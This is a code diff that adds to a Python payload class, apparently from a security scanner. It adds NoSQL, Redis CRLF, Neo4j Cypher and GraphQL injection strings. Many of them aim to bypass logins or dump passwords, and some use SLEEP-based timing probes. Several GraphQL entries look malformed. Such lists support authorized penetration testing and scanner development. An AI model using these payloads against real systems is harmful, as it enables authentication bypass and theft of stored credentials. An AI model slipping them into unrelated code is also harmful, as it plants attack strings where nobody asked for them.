@@ -234,30 +234,51 @@ class PolyglotPayloads:
     
     # NoSQL injection polyglots
     NOSQL_INJECTION = [
-        # MongoDB injection
+        # MongoDB operator injection
         "admin' || '1'=='1",
         '{"$where":"1==1"}',
         '{"$gt":""}',
         '{"$ne":null}',
         '{"$regex":".*"}',
-        
+        '{"$exists":true}',
+        '{"$gte":""}',
+        # MongoDB aggregation injection
+        '{"$or":[{"password":{"$exists":true}}]}',
+        '{"$where":"function() { return true; }"}',
+        # URL-encoded MongoDB operator injection
+        "username[$ne]=null&password[$ne]=null",
+        "username[$gt]=&password[$gt]=",
+        "username[$regex]=.*&password[$regex]=.*",
         # CouchDB injection
         '{"selector":{"_id":{"$gt":null}}}',
-        
-        # Redis injection
+        '{"selector":{"password":{"$regex":".*"}}}',
+        # Redis CRLF injection
         "*\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",
+        "\r\nSET mykey malicious\r\n",
+        "%0d%0aSET%20mykey%20malicious%0d%0a",
+        # Neo4j Cypher injection
+        "' OR 1=1 WITH 1 as a MATCH (n) RETURN n//",
+        "' UNION MATCH (u:User) RETURN u.password//",
     ]
     
     # GraphQL injection polyglots
     GRAPHQL_INJECTION = [
         # GraphQL query injection
         "query{users(where:{id:{_eq:1}OR:{id:{_eq:1}})}",
-        
+        # GraphQL variable injection
+        '{"id": "1\' OR \'1\'=\'1\'--"}',
+        '{"id": "1\' AND SLEEP(5)--"}',
+        '{"username": "admin\'--"}',
         # GraphQL mutation injection
         'mutation{updateUser(id:1,data:{name:"admin\' OR \'1\'=\'1\'--"})}',
-        
+        'mutation{login(username:"admin\'--",password:"x")}',
         # GraphQL introspection
         "{__schema{types{name}}}",
+        "{__type(name:\"User\"){fields{name}}}",
+        # Batching attack
+        '[{"query":"{user(id:\\"1\' OR \\'1\\'=\\'1\\'")}"}]',
+        # Fragment injection
+        "fragment sqli on User { password(where: {id: {_eq: \"1' UNION SELECT password FROM admin--\"}}) }",
     ]
     
     # Time-based polyglots with various delays
